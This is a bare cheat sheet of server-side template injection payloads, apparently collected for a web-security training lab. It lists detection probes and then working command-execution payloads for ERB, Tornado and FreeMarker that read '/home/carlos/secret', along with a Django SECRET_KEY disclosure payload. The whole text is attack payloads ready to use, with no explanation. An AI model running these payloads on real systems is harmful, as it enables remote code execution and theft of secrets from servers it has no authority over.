# SSTI

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
${foobar}
${{<%[%'"}}%\.
<%= system("cat /home/carlos/secret") %>
<%25+system("cat+/home/carlos/secret")+%25>
{% import os %}{{os.system('cat /home/carlos/secret')
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /home/carlos/secret") }
{{settings.SECRET_KEY}}
${{<%[%'"}}%\,
{% debug %}
```  
